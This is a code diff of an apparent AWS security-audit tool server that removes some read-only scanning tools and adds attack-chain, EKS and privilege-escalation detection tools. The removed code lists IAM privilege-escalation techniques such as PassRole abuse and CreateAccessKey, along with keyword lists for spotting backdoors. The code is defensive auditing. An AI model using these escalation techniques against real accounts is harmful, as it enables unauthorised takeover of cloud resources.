@@ -11,13 +11,13 @@ import {
 // AWS SDK imports - Phase 1
 import { EC2Client, DescribeInstancesCommand, DescribeSecurityGroupsCommand, DescribeVpcsCommand, DescribeSubnetsCommand } from "@aws-sdk/client-ec2";
 import { S3Client, ListBucketsCommand, GetBucketPolicyCommand, GetBucketEncryptionCommand, GetPublicAccessBlockCommand, GetBucketAclCommand, GetBucketVersioningCommand, GetBucketLoggingCommand, GetBucketPolicyStatusCommand, GetBucketLocationCommand } from "@aws-sdk/client-s3";
-import { IAMClient, ListUsersCommand, ListRolesCommand, ListPoliciesCommand, GetPolicyVersionCommand, ListAttachedUserPoliciesCommand, ListAttachedRolePoliciesCommand, ListUserPoliciesCommand, GetUserPolicyCommand, ListRolePoliciesCommand, GetRolePolicyCommand, GetRoleCommand } from "@aws-sdk/client-iam";
+import { IAMClient, ListUsersCommand, ListRolesCommand, ListPoliciesCommand, GetPolicyVersionCommand, ListAttachedUserPoliciesCommand, ListAttachedRolePoliciesCommand, ListUserPoliciesCommand, GetUserPolicyCommand, ListRolePoliciesCommand, GetRolePolicyCommand, GetRoleCommand, ListGroupsForUserCommand, ListAttachedGroupPoliciesCommand, GetPolicyCommand } from "@aws-sdk/client-iam";
 import { RDSClient, DescribeDBInstancesCommand, DescribeDBClustersCommand } from "@aws-sdk/client-rds";
 import { STSClient, GetCallerIdentityCommand } from "@aws-sdk/client-sts";
 import { OrganizationsClient, ListAccountsCommand, DescribeOrganizationCommand } from "@aws-sdk/client-organizations";
 
 // AWS SDK imports - Phase 2
-import { EKSClient, ListClustersCommand, DescribeClusterCommand } from "@aws-sdk/client-eks";
+import { EKSClient, ListClustersCommand, DescribeClusterCommand, ListNodegroupsCommand, DescribeNodegroupCommand, ListFargateProfilesCommand, DescribeFargateProfileCommand } from "@aws-sdk/client-eks";
 import { LambdaClient, ListFunctionsCommand, GetFunctionCommand } from "@aws-sdk/client-lambda";
 import { SecretsManagerClient, ListSecretsCommand, DescribeSecretCommand } from "@aws-sdk/client-secrets-manager";
 import { KMSClient, ListKeysCommand, DescribeKeyCommand } from "@aws-sdk/client-kms";
@@ -318,20 +318,6 @@ const TOOLS: Tool[] = [
     },
   },
   {
-    name: "analyze_attack_paths",
-    description: "Identify privilege escalation paths and attack chains (IAM roles, EC2 instance profiles, Lambda functions)",
-    inputSchema: {
-      type: "object",
-      properties: {
-        region: {
-          type: "string",
-          description: "AWS region to analyze",
-        },
-      },
-      required: ["region"],
-    },
-  },
-  {
     name: "generate_security_report",
     description: "Generate comprehensive security assessment report with all findings (PDF/HTML/CSV export)",
     inputSchema: {
@@ -521,14 +507,6 @@ const TOOLS: Tool[] = [
   },
   // ========== PHASE 2: ADVANCED PERMISSION ANALYSIS TOOLS ==========
   {
-    name: "scan_privilege_escalation_paths",
-    description: "Analyze IAM users for privilege escalation methods (AttachUserPolicy, CreateAccessKey, PassRole, etc.)",
-    inputSchema: {
-      type: "object",
-      properties: {},
-    },
-  },
-  {
     name: "analyze_iam_trust_chains",
     description: "Analyze IAM role trust relationships for wildcard principals, cross-account access, and unrestricted service access",
     inputSchema: {
@@ -544,40 +522,10 @@ const TOOLS: Tool[] = [
       properties: {},
     },
   },
-  {
-    name: "detect_cross_account_access",
-    description: "Detect all cross-account role trust relationships and external AWS account access",
-    inputSchema: {
-      type: "object",
-      properties: {},
-    },
-  },
-  {
-    name: "detect_service_role_risks",
-    description: "Detect EC2 instance profiles and Lambda execution roles with excessive permissions or security risks",
-    inputSchema: {
-      type: "object",
-      properties: {},
-    },
-  },
   // ========== PHASE 3: PERSISTENCE & EVASION DETECTION TOOLS ==========
   {
     name: "detect_persistence_mechanisms",
     description: "Detect persistence backdoors: Lambda layers, EC2 user data, EventBridge triggers, IAM role modifications, access key rotation",
-    inputSchema: {
-      type: "object",
-      properties: {
-        region: {
-          type: "string",
-          description: "AWS region to scan",
-        },
-      },
-      required: ["region"],
-    },
-  },
-  {
-    name: "scan_for_backdoors",
-    description: "Scan for backdoor indicators: suspicious IAM users, old access keys, unusual roles, Lambda functions with suspicious code patterns",
     inputSchema: {
       type: "object",
       properties: {
@@ -638,19 +586,6 @@ const TOOLS: Tool[] = [
         },
       },
       required: ["region"],
-    },
-  },
-  {
-    name: "analyze_iam_privilege_escalation",
-    description: "Deep analysis of IAM privilege escalation paths: iam:PassRole abuse, sts:AssumeRole chains, policy attachment permissions, service-linked role exploitation",
-    inputSchema: {
-      type: "object",
-      properties: {
-        targetRole: {
-          type: "string",
-          description: "Optional: specific role ARN to analyze escalation paths to",
-        },
-      },
     },
   },
   {
@@ -834,6 +769,64 @@ const TOOLS: Tool[] = [
       },
     },
   },
+  // ========== ATTACK CHAIN & ADVANCED ANALYSIS TOOLS ==========
+  {
+    name: "build_attack_chains",
+    description: "Build multi-step attack chains from IAM findings. Identifies complete attack paths from initial access to privilege escalation, lateral movement, and data exfiltration. Maps to MITRE ATT&CK techniques and calculates blast radius.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        region: {
+          type: "string",
+          description: "AWS region to analyze (default: us-east-1)",
+        },
+        principalArn: {
+          type: "string",
+          description: "Optional: Specific IAM principal ARN to analyze attack chains for",
+        },
+        minSeverity: {
+          type: "string",
+          enum: ["LOW", "MEDIUM", "HIGH", "CRITICAL"],
+          description: "Minimum severity to include (default: HIGH)",
+        },
+      },
+    },
+  },
+  {
+    name: "analyze_eks_attack_surface",
+    description: "Comprehensive EKS security analysis: IRSA (IAM Roles for Service Accounts) abuse, node role credential theft via IMDS, cluster config manipulation, pod security risks, and Kubernetes RBAC to AWS IAM privilege escalation paths.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        region: {
+          type: "string",
+          description: "AWS region containing EKS clusters",
+        },
+        clusterName: {
+          type: "string",
+          description: "Optional: Specific EKS cluster to analyze (analyzes all if omitted)",
+        },
+      },
+      required: ["region"],
+    },
+  },
+  {
+    name: "detect_privesc_patterns",
+    description: "Detect 50+ IAM privilege escalation patterns based on Rhino Security Labs research. Identifies PassRole abuse, policy manipulation, credential access, Lambda abuse, and more with detailed remediation steps.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        principalArn: {
+          type: "string",
+          description: "Optional: Specific IAM user/role ARN to analyze",
+        },
+        includeRemediation: {
+          type: "boolean",
+          description: "Include detailed remediation steps (default: true)",
+        },
+      },
+    },
+  },
 ];
 
 // Tool handlers
@@ -899,10 +892,6 @@ server.setRequestHandler(CallToolRequestSchema, async (request) => {
         if (!args || !args.region) throw new Error("region is required (use 'all', 'common', or specific region)");
         return { content: [{ type: "text", text: await enumeratePublicResourcesMultiRegion(args.region as string) }] };
 
-      case "analyze_attack_paths":
-        if (!args || !args.region) throw new Error("region is required");
-        return { content: [{ type: "text", text: await analyzeAttackPaths(args.region as string) }] };
-
       case "generate_security_report":
         if (!args || !args.region) throw new Error("region is required");
         return { content: [{ type: "text", text: await generateSecurityReport(args.region as string, args.format as string | undefined, args.outputFile as string | undefined) }] };
@@ -940,29 +929,16 @@ server.setRequestHandler(CallToolRequestSchema, async (request) => {
         return { content: [{ type: "text", text: await enumerateDetectionServices(args.region as string) }] };
 
       // ========== PHASE 2: ADVANCED PERMISSION ANALYSIS TOOLS ==========
-      case "scan_privilege_escalation_paths":
-        return { content: [{ type: "text", text: await scanPrivilegeEscalationPaths() }] };
-
       case "analyze_iam_trust_chains":
         return { content: [{ type: "text", text: await analyzeIAMTrustChains() }] };
 
       case "detect_permissive_roles":
         return { content: [{ type: "text", text: await findOverlyPermissiveRoles() }] };
 
-      case "detect_cross_account_access":
-        return { content: [{ type: "text", text: await detectCrossAccountAccess() }] };
-
-      case "detect_service_role_risks":
-        return { content: [{ type: "text", text: await identifyServiceRoleRisks() }] };
-
       // ========== PHASE 3: PERSISTENCE & EVASION DETECTION TOOLS ==========
       case "detect_persistence_mechanisms":
         if (!args || !args.region) throw new Error("region is required");
         return { content: [{ type: "text", text: await detectPersistenceMechanisms(args.region as string) }] };
-
-      case "scan_for_backdoors":
-        if (!args || !args.region) throw new Error("region is required");
-        return { content: [{ type: "text", text: await scanForBackdoors(args.region as string) }] };
 
       case "analyze_service_role_chain":
         if (!args || !args.region) throw new Error("region is required");
@@ -979,9 +955,6 @@ server.setRequestHandler(CallToolRequestSchema, async (request) => {
       case "analyze_cloudwatch_security":
         if (!args || !args.region) throw new Error("region is required");
         return { content: [{ type: "text", text: await analyzeCloudWatchSecurity(args.region as string) }] };
-
-      case "analyze_iam_privilege_escalation":
-        return { content: [{ type: "text", text: await analyzeIAMPrivilegeEscalation(args?.targetRole as string | undefined) }] };
 
       case "scan_ssm_security":
         if (!args || !args.region) throw new Error("region is required");
@@ -1034,6 +1007,26 @@ server.setRequestHandler(CallToolRequestSchema, async (request) => {
 
       case "cache_clear":
         return { content: [{ type: "text", text: clearCache(args?.pattern as string | undefined) }] };
+
+      // ========== ATTACK CHAIN & ADVANCED ANALYSIS TOOLS ==========
+      case "build_attack_chains":
+        return { content: [{ type: "text", text: await buildAttackChains(
+          args?.region as string || 'us-east-1',
+          args?.principalArn as string | undefined,
+          args?.minSeverity as string || 'HIGH'
+        ) }] };
+
+      case "analyze_eks_attack_surface":
+        return { content: [{ type: "text", text: await analyzeEKSAttackSurface(
+          args?.region as string,
+          args?.clusterName as string | undefined
+        ) }] };
+
+      case "detect_privesc_patterns":
+        return { content: [{ type: "text", text: await detectPrivescPatterns(
+          args?.principalArn as string | undefined,
+          args?.includeRemediation !== false
+        ) }] };
 
       default:
         return {
@@ -1407,7 +1400,7 @@ async function analyzeLambdaSecurity(region: string, scanMode?: string): Promise
     output += "## Lambda Functions\n" + await enumerateLambdaFunctions(region) + "\n\n";
   }
   if (mode === "roles" || mode === "both") {
-    output += "## Service Role Risks\n" + await identifyServiceRoleRisks() + "\n";
+    output += "## Service Role Analysis\n" + await findOverlyPermissiveRoles() + "\n";
   }
   return output;
 }
@@ -2523,58 +2516,6 @@ async function enumeratePublicResources(region: string): Promise<string> {
   } else {
     output += `[OK] No publicly accessible resources found\n`;
   }
-
-  return output;
-}
-
-async function analyzeAttackPaths(region: string): Promise<string> {
-  let output = `# Attack Path Analysis (${region})\n\n`;
-  const attackPaths: string[] = [];
-
-  // Analyze EC2 instances with IAM roles
-  const ec2Client = new EC2Client({ region });
-  const ec2Command = new DescribeInstancesCommand({});
-  const ec2Response = await ec2Client.send(ec2Command);
-
-  output += `## EC2 Instance → IAM Role → Resource Access\n\n`;
-  
-  for (const reservation of ec2Response.Reservations || []) {
-    for (const instance of reservation.Instances || []) {
-      const hasPublicIP = instance.PublicIpAddress ? true : false;
-      const iamRole = instance.IamInstanceProfile?.Arn?.split("/").pop();
-      
-      if (hasPublicIP && iamRole) {
-        attackPaths.push(`[WARN] Public EC2 ${instance.InstanceId} has IAM role ${iamRole} - potential pivot point`);
-      }
-    }
-  }
-
-  // Analyze Lambda functions with IAM roles
-  const lambdaClient = new LambdaClient({ region });
-  const lambdaCommand = new ListFunctionsCommand({});
-  const lambdaResponse = await lambdaClient.send(lambdaCommand);
-
-  output += `## Lambda Functions with Privileged Roles\n\n`;
-
-  for (const func of lambdaResponse.Functions || []) {
-    const roleName = func.Role?.split("/").pop();
-    if (roleName) {
-      // Check if role name suggests high privileges
-      if (roleName.toLowerCase().includes("admin") || roleName.toLowerCase().includes("full")) {
-        attackPaths.push(`[WARN] Lambda ${func.FunctionName} has privileged role ${roleName} - code execution risk`);
-      }
-    }
-  }
-
-  output += `## Attack Paths Identified: ${attackPaths.length}\n\n`;
-  
-  if (attackPaths.length > 0) {
-    attackPaths.forEach(p => output += `${p}\n`);
-  } else {
-    output += `[OK] No obvious attack paths detected\n`;
-  }
-
-  output += `\n[TIP] Manual review recommended: Check IAM role permissions, Lambda environment variables, EC2 security groups\n`;
 
   return output;
 }
@@ -4277,192 +4218,6 @@ async function scanEventBridgeSecurity(region: string): Promise<string> {
 
 // ============ PHASE 2: ADVANCED PERMISSION ANALYSIS ============
 
-async function scanPrivilegeEscalationPaths(): Promise<string> {
-  let output = `# Privilege Escalation Path Analysis\n\n`;
-  const findings: { user: string; method: string; risk: string; }[] = [];
-  
-  try {
-    // Get all IAM users
-    const usersCmd = new ListUsersCommand({});
-    const usersResponse = await iamClient.send(usersCmd);
-    
-    if (!usersResponse.Users || usersResponse.Users.length === 0) {
-      return output + "[OK] No IAM users found to analyze.\n";
-    }
-    
-    // Get all managed policies
-    const policiesCmd = new ListPoliciesCommand({ Scope: "Local" });
-    const policiesResponse = await iamClient.send(policiesCmd);
-    
-    // Escalation methods based on PACU analysis
-    const escalationMethods: Record<string, { permissions: string[]; risk: string; }> = {
-      "AttachUserPolicy": {
-        permissions: ["iam:AttachUserPolicy"],
-        risk: "CRITICAL - Can attach admin policy to self"
-      },
-      "CreateAccessKey": {
-        permissions: ["iam:CreateAccessKey"],
-        risk: "CRITICAL - Can create persistent credentials for other users"
-      },
-      "CreateLoginProfile": {
-        permissions: ["iam:CreateLoginProfile"],
-        risk: "CRITICAL - Can create console access for other users"
-      },
-      "UpdateAssumeRolePolicy": {
-        permissions: ["iam:UpdateAssumeRolePolicy", "sts:AssumeRole"],
-        risk: "HIGH - Can modify role trust relationship"
-      },
-      "PassRoleToLambda": {
-        permissions: ["iam:PassRole", "lambda:CreateFunction", "lambda:InvokeFunction"],
-        risk: "CRITICAL - Can execute code with privileged role"
-      },
-      "PassRoleToEC2": {
-        permissions: ["iam:PassRole", "ec2:RunInstances"],
-        risk: "CRITICAL - Can launch EC2 with privileged role"
-      },
-      "PassRoleToCloudFormation": {
-        permissions: ["iam:PassRole", "cloudformation:CreateStack"],
-        risk: "CRITICAL - Can create resources with privileged role"
-      },
-      "CreatePolicyVersion": {
-        permissions: ["iam:CreatePolicyVersion"],
-        risk: "HIGH - Can create new policy versions with escalated permissions"
-      },
-      "SetDefaultPolicyVersion": {
-        permissions: ["iam:SetDefaultPolicyVersion"],
-        risk: "HIGH - Can revert policy to older more permissive version"
-      },
-      "PutUserPolicy": {
-        permissions: ["iam:PutUserPolicy"],
-        risk: "CRITICAL - Can attach inline policy to self"
-      },
-    };
-    
-    output += `## Users with Privilege Escalation Paths\n\n`;
-    
-    // Check each user for escalation permissions
-    for (const user of usersResponse.Users) {
-      const userName = user.UserName!;
-      
-      // Get attached policies
-      const userPoliciesCmd = new ListAttachedUserPoliciesCommand({ UserName: userName });
-      const userPolicies = await iamClient.send(userPoliciesCmd);
-      
-      // Get inline policies
-      const inlinePoliciesCmd = new ListUserPoliciesCommand({ UserName: userName });
-      const inlinePolicies = await iamClient.send(inlinePoliciesCmd);
-      
-      let userPermissions: Set<string> = new Set();
-      
-      // Extract permissions from attached policies
-      for (const policy of userPolicies.AttachedPolicies || []) {
-        try {
-          const policyArn = policy.PolicyArn;
-          if (!policyArn) continue;
-          
-          const versions: { Versions?: any[] } = { Versions: [] };
-          // Simplified: try getting default policy version
-          try {
-            const policyVersionCmd = new GetPolicyVersionCommand({ PolicyArn: policyArn, VersionId: "v1" });
-            const versionResponse = await iamClient.send(policyVersionCmd);
-            if (versionResponse.PolicyVersion) {
-              versions.Versions = [versionResponse.PolicyVersion];
-            }
-          } catch (e) {
-            // Skip
-          }
-          
-          for (const version of versions.Versions || []) {
-            if (!version.IsDefaultVersion) continue;
-            
-            const getPolicyCmd = new GetPolicyVersionCommand({ PolicyArn: policyArn, VersionId: version.VersionId! });
-            const policyVersion = await iamClient.send(getPolicyCmd);
-            
-            const policyDoc = policyVersion.PolicyVersion?.Document ?
-              JSON.parse(decodeURIComponent(policyVersion.PolicyVersion.Document)) : null;
-            
-            if (policyDoc?.Statement) {
-              for (const statement of policyDoc.Statement) {
-                if (statement.Effect !== "Allow") continue;
-                
-                const actions = Array.isArray(statement.Action) ? statement.Action : [statement.Action];
-                for (const action of actions) {
-                  if (typeof action === "string") {
-                    userPermissions.add(action);
-                  }
-                }
-              }
-            }
-          }
-        } catch (error) {
-          // Skip policies we can't read
-        }
-      }
-      
-      // Extract permissions from inline policies
-      for (const policyName of inlinePolicies.PolicyNames || []) {
-        try {
-          const inlinePolicyCmd = new GetUserPolicyCommand({ UserName: userName, PolicyName: policyName });
-          const inlinePolicy = await iamClient.send(inlinePolicyCmd);
-          
-          const policyDoc = inlinePolicy.PolicyDocument ?
-            JSON.parse(decodeURIComponent(inlinePolicy.PolicyDocument)) : null;
-          
-          if (policyDoc?.Statement) {
-            for (const statement of policyDoc.Statement) {
-              if (statement.Effect !== "Allow") continue;
-              
-              const actions = Array.isArray(statement.Action) ? statement.Action : [statement.Action];
-              for (const action of actions) {
-                if (typeof action === "string") {
-                  userPermissions.add(action);
-                }
-              }
-            }
-          }
-        } catch (error) {
-          // Skip policies we can't read
-        }
-      }
-      
-      // Check for escalation methods
-      let userHasEscalation = false;
-      for (const [method, details] of Object.entries(escalationMethods)) {
-        const hasAllPermissions = details.permissions.every(perm =>
-          Array.from(userPermissions).some(up => up === perm || up === "iam:*" || up === "*")
-        );
-        
-        if (hasAllPermissions) {
-          findings.push({ user: userName, method, risk: details.risk });
-          userHasEscalation = true;
-        }
-      }
-      
-      if (userHasEscalation) {
-        const userFindings = findings.filter(f => f.user === userName);
-        output += `### [CRITICAL] ${userName}\n`;
-        for (const finding of userFindings) {
-          output += `- **${finding.method}:** ${finding.risk}\n`;
-        }
-        output += `\n`;
-      }
-    }
-    
-    if (findings.length === 0) {
-      output += `[OK] No privilege escalation paths detected.\n`;
-    } else {
-      output += `## Summary\n`;
-      output += `**Critical Escalation Paths Found:** ${findings.filter(f => f.risk.includes("CRITICAL")).length}\n`;
-      output += `**High Escalation Paths:** ${findings.filter(f => f.risk.includes("HIGH")).length}\n`;
-    }
-    
-  } catch (error: any) {
-    output += `[FAIL] Error analyzing escalation paths: ${error.message}\n`;
-  }
-  
-  return output;
-}
-
 async function analyzeIAMTrustChains(): Promise<string> {
   let output = `# IAM Trust Relationship Analysis\n\n`;
   const findings: string[] = [];
@@ -4661,200 +4416,6 @@ async function findOverlyPermissiveRoles(): Promise<string> {
   return output;
 }
 
-async function detectCrossAccountAccess(): Promise<string> {
-  let output = `# Cross-Account Access Detection\n\n`;
-  const crossAccountAccess: Record<string, string[]> = {};
-  
-  try {
-    const rolesCmd = new ListRolesCommand({});
-    const rolesResponse = await iamClient.send(rolesCmd);
-    
-    if (!rolesResponse.Roles || rolesResponse.Roles.length === 0) {
-      return output + "[OK] No roles found to analyze.\n";
-    }
-    
-    // Get current account ID
-    const stsclient2 = new STSClient({});
-    const stsCmd = new GetCallerIdentityCommand({});
-    const stsResponse = await stsclient2.send(stsCmd);
-    const currentAccountId = stsResponse.Account || "0";
-    
-    output += `## Cross-Account Access Analysis\n`;
-    output += `**Current Account ID:** ${currentAccountId}\n\n`;
-    
-    let crossAccountRoles = 0;
-    let unknownAccountAccess = 0;
-    
-    for (const role of rolesResponse.Roles) {
-      const trustPolicy = role.AssumeRolePolicyDocument ?
-        JSON.parse(decodeURIComponent(role.AssumeRolePolicyDocument)) : null;
-      
-      if (!trustPolicy || !trustPolicy.Statement) continue;
-      
-      for (const statement of trustPolicy.Statement) {
-        if (statement.Effect !== "Allow") continue;
-        
-        const principals = Array.isArray(statement.Principal?.AWS)
-          ? statement.Principal.AWS
-          : statement.Principal?.AWS ? [statement.Principal.AWS] : [];
-        
-        for (const principal of principals) {
-          if (typeof principal === "string" && principal.includes("arn:aws:iam::")) {
-            const principalAccount = principal.split("::")[1]?.split(":")[0];
-            
-            if (principalAccount && principalAccount !== currentAccountId && principalAccount !== "0") {
-              crossAccountRoles++;
-              
-              if (!crossAccountAccess[principalAccount]) {
-                crossAccountAccess[principalAccount] = [];
-              }
-              crossAccountAccess[principalAccount].push(role.RoleName!);
-            }
-          }
-        }
-      }
-    }
-    
-    if (Object.keys(crossAccountAccess).length === 0) {
-      output += `[OK] No cross-account role access detected.\n`;
-    } else {
-      output += `[MEDIUM] DETECTED: Cross-account access from ${Object.keys(crossAccountAccess).length} external account(s)\n\n`;
-      
-      for (const [accountId, roles] of Object.entries(crossAccountAccess)) {
-        output += `### Account: ${accountId}\n`;
-        output += `Can assume ${roles.length} role(s):\n`;
-        for (const role of roles) {
-          output += `- ${role}\n`;
-        }
-        output += `\n`;
-      }
-    }
-    
-    output += `## Summary\n`;
-    output += `- Roles with cross-account access: ${crossAccountRoles}\n`;
-    output += `- External accounts with access: ${Object.keys(crossAccountAccess).length}\n`;
-    
-  } catch (error: any) {
-    output += `[FAIL] Error detecting cross-account access: ${error.message}\n`;
-  }
-  
-  return output;
-}
-
-async function identifyServiceRoleRisks(): Promise<string> {
-  let output = `# Service Role Risk Assessment\n\n`;
-  const findings: string[] = [];
-  
-  try {
-    const ec2Client = new EC2Client({});
-    
-    // Get EC2 instances
-    const instancesCmd = new DescribeInstancesCommand({});
-    const instances = await ec2Client.send(instancesCmd);
-    
-    let publicInstancesWithRole = 0;
-    let instancesWithHighRiskRole = 0;
-    
-    output += `## EC2 Instance Profile Risk Analysis\n\n`;
-    
-    for (const reservation of instances.Reservations || []) {
-      for (const instance of reservation.Instances || []) {
-        if (!instance.IamInstanceProfile) continue;
-        
-        const profileArn = instance.IamInstanceProfile.Arn || "";
-        const roleName = profileArn.split("/").pop();
-        const instanceId = instance.InstanceId;
-        const hasPublicIp = !!instance.PublicIpAddress;
-        
-        if (hasPublicIp) {
-          publicInstancesWithRole++;
-          findings.push(`[CRITICAL] ${instanceId}: Public IP (${instance.PublicIpAddress}) with IAM role ${roleName}`);
-          
-          // Check if role is permissive
-          try {
-            const roleCmd = new GetRoleCommand({ RoleName: roleName! });
-            const role = await iamClient.send(roleCmd);
-            
-            const trustPolicy = role.Role?.AssumeRolePolicyDocument ?
-              JSON.parse(decodeURIComponent(role.Role.AssumeRolePolicyDocument)) : null;
-            
-            if (trustPolicy && JSON.stringify(trustPolicy).includes("ec2.amazonaws.com")) {
-              findings.push(`   [WARN] Role assumable by EC2 service - credentials accessible via metadata`);
-            }
-          } catch (error) {
-            // Skip
-          }
-        }
-      }
-    }
-    
-    // Analyze Lambda execution roles
-    const lambdaClient = new LambdaClient({});
-    const functionsCmd = new ListFunctionsCommand({});
-    const functions = await lambdaClient.send(functionsCmd);
-    
-    output += `## Lambda Execution Role Risk Analysis\n\n`;
-    
-    for (const func of functions.Functions || []) {
-      const roleArn = func.Role;
-      const roleName = roleArn?.split("/").pop();
-      
-      if (!roleName) continue;
-      
-      // Check environment variables for secrets
-      if (func.Environment?.Variables && Object.keys(func.Environment.Variables).length > 0) {
-        const envVars = Object.keys(func.Environment.Variables);
-        const hasSecrets = envVars.some(v => 
-          v.toUpperCase().includes("SECRET") || 
-          v.toUpperCase().includes("PASSWORD") ||
-          v.toUpperCase().includes("API_KEY")
-        );
-        
-        if (hasSecrets) {
-          findings.push(`[HIGH] ${func.FunctionName}: Contains secrets in environment variables`);
-          instancesWithHighRiskRole++;
-        }
-      }
-      
-      // Check for wildcard resource permissions
-      try {
-        const policiesCmd = new ListRolePoliciesCommand({ RoleName: roleName });
-        const policies = await iamClient.send(policiesCmd);
-        
-        for (const policyName of policies.PolicyNames || []) {
-          const policyCmd = new GetRolePolicyCommand({ RoleName: roleName, PolicyName: policyName });
-          const policy = await iamClient.send(policyCmd);
-          
-          const policyDoc = policy.PolicyDocument ?
-            JSON.parse(decodeURIComponent(policy.PolicyDocument)) : null;
-          
-          const policyString = JSON.stringify(policyDoc);
-          if (policyString.includes('"Action":"*"') || policyString.includes('"Resource":"*"')) {
-            findings.push(`[CRITICAL] ${func.FunctionName}: Has wildcard permissions (*:* on *)`);
-            instancesWithHighRiskRole++;
-          }
-        }
-      } catch (error) {
-        // Skip
-      }
-    }
-    
-    if (findings.length === 0) {
-      output += `[OK] No high-risk service role configurations found.\n`;
-    } else {
-      output += findings.join("\n") + "\n\n";
-      output += `## Summary\n`;
-      output += `- Public EC2 instances with IAM roles: ${publicInstancesWithRole}\n`;
-      output += `- High-risk service roles identified: ${instancesWithHighRiskRole}\n`;
-    }
-    
-  } catch (error: any) {
-    output += `[FAIL] Error analyzing service role risks: ${error.message}\n`;
-  }
-  
-  return output;
-}
-
 // ============ PHASE 3: PERSISTENCE & EVASION DETECTION ============
 
 async function detectPersistenceMechanisms(region: string): Promise<string> {
@@ -4895,80 +4456,6 @@ async function detectPersistenceMechanisms(region: string): Promise<string> {
       output += `[OK] No obvious persistence mechanisms detected\n`;
     } else {
       findings.forEach(f => output += `${f}\n`);
-    }
-    
-  } catch (error: any) {
-    output += `[FAIL] Error: ${error.message}\n`;
-  }
-  
-  return output;
-}
-
-async function scanForBackdoors(region: string): Promise<string> {
-  let output = `# Backdoor Indicator Scan\n\n`;
-  const indicators: string[] = [];
-  
-  try {
-    output += `## Suspicious User Accounts\n\n`;
-    
-    const usersCmd = new ListUsersCommand({});
-    const users = await iamClient.send(usersCmd);
-    
-    for (const user of users.Users || []) {
-      const userName = user.UserName?.toLowerCase() || "";
-      const suspiciousPatterns = ["backdoor", "shell", "reverse", "exploit"];
-      
-      if (suspiciousPatterns.some(p => userName.includes(p))) {
-        indicators.push(`[CRITICAL] Suspicious user name: ${user.UserName}`);
-      }
-      
-      // Check user age
-      const daysSince = Math.floor((Date.now() - (user.CreateDate?.getTime() || 0)) / (1000 * 60 * 60 * 24));
-      if (daysSince < 7) {
-        indicators.push(`[MEDIUM] Newly created user: ${user.UserName} (${daysSince} days)`);
-      }
-    }
-    output += `Checked ${users.Users?.length || 0} users\n\n`;
-    
-    output += `## Lambda Function Anomalies\n\n`;
-    const lambdaClient = new LambdaClient({ region });
-    const functionsCmd = new ListFunctionsCommand({});
-    const functions = await lambdaClient.send(functionsCmd);
-    
-    for (const func of functions.Functions || []) {
-      const funcName = func.FunctionName?.toLowerCase() || "";
-      const suspiciousNames = ["backdoor", "shell", "exec", "exploit"];
-      
-      if (suspiciousNames.some(s => funcName.includes(s))) {
-        indicators.push(`[CRITICAL] Suspicious Lambda function: ${func.FunctionName}`);
-      }
-      
-      if (func.Timeout && func.Timeout > 300) {
-        indicators.push(`[MEDIUM] Lambda with excessive timeout (${func.Timeout}s): ${func.FunctionName}`);
-      }
-    }
-    output += `Analyzed ${functions.Functions?.length || 0} functions\n\n`;
-    
-    output += `## IAM Role Anomalies\n\n`;
-    const rolesCmd = new ListRolesCommand({});
-    const roles = await iamClient.send(rolesCmd);
-    
-    let suspiciousRoles = 0;
-    for (const role of roles.Roles || []) {
-      const roleName = role.RoleName?.toLowerCase() || "";
-      if (roleName.includes("backdoor") || roleName.includes("exploit")) {
-        indicators.push(`[CRITICAL] Suspicious role: ${role.RoleName}`);
-        suspiciousRoles++;
-      }
-    }
-    output += `Checked ${roles.Roles?.length || 0} roles, ${suspiciousRoles} suspicious\n\n`;
-    
-    output += `## Summary\n`;
-    output += `**Backdoor Indicators:** ${indicators.length}\n`;
-    if (indicators.length === 0) {
-      output += `[OK] No backdoor indicators found\n`;
-    } else {
-      indicators.forEach(i => output += `${i}\n`);
     }
     
   } catch (error: any) {
@@ -5192,86 +4679,6 @@ async function analyzeCloudWatchSecurity(region: string): Promise<string> {
 }
 
 /**
- * Deep IAM privilege escalation analysis
- */
-async function analyzeIAMPrivilegeEscalation(targetRole?: string): Promise<string> {
-  let output = `# IAM Privilege Escalation Analysis\n\n`;
-
-  try {
-    // Get all roles
-    const rolesCmd = new ListRolesCommand({});
-    const roles = await iamClient.send(rolesCmd);
-
-    output += `## Roles with Dangerous Permissions\n\n`;
-    
-    const dangerousPermissions = [
-      'iam:CreateRole', 'iam:CreateUser', 'iam:AttachRolePolicy', 'iam:AttachUserPolicy',
-      'iam:PutRolePolicy', 'iam:PutUserPolicy', 'iam:CreateAccessKey',
-      'iam:CreateLoginProfile', 'iam:UpdateLoginProfile', 'iam:PassRole',
-      'sts:AssumeRole', 'lambda:CreateFunction', 'lambda:UpdateFunctionCode',
-      'ec2:RunInstances', 'cloudformation:CreateStack'
-    ];
-
-    let escalationPaths: string[] = [];
-    
-    for (const role of roles.Roles || []) {
-      // Check inline policies
-      const inlinePoliciesCmd = new ListRolePoliciesCommand({ RoleName: role.RoleName });
-      const inlinePolicies = await iamClient.send(inlinePoliciesCmd);
-      
-      for (const policyName of inlinePolicies.PolicyNames || []) {
-        const policyCmd = new GetRolePolicyCommand({ RoleName: role.RoleName, PolicyName: policyName });
-        const policy = await iamClient.send(policyCmd);
-        const policyDoc = decodeURIComponent(policy.PolicyDocument || '{}');
-        
-        for (const perm of dangerousPermissions) {
-          if (policyDoc.includes(perm) || policyDoc.includes('"*"') || policyDoc.includes('"Action": "*"')) {
-            escalationPaths.push(`**${role.RoleName}** → ${perm} (inline policy: ${policyName})`);
-            break;
-          }
-        }
-      }
-
-      // Check attached policies
-      const attachedPoliciesCmd = new ListAttachedRolePoliciesCommand({ RoleName: role.RoleName });
-      const attachedPolicies = await iamClient.send(attachedPoliciesCmd);
-      
-      for (const policy of attachedPolicies.AttachedPolicies || []) {
-        if (policy.PolicyName?.includes('Admin') || policy.PolicyName?.includes('FullAccess')) {
-          escalationPaths.push(`**${role.RoleName}** → ${policy.PolicyName} (attached)`);
-        }
-      }
-    }
-
-    if (escalationPaths.length > 0) {
-      output += `### Potential Escalation Paths\n\n`;
-      for (const path of escalationPaths.slice(0, 20)) {
-        output += `- ${path}\n`;
-      }
-      if (escalationPaths.length > 20) {
-        output += `\n...and ${escalationPaths.length - 20} more\n`;
-      }
-    } else {
-      output += `[OK] No obvious escalation paths found\n`;
-    }
-
-    output += `\n## Common Privilege Escalation Techniques\n\n`;
-    output += `| Technique | Required Permissions | Risk |\n`;
-    output += `|-----------|---------------------|------|\n`;
-    output += `| PassRole abuse | iam:PassRole, ec2:RunInstances | CRITICAL |\n`;
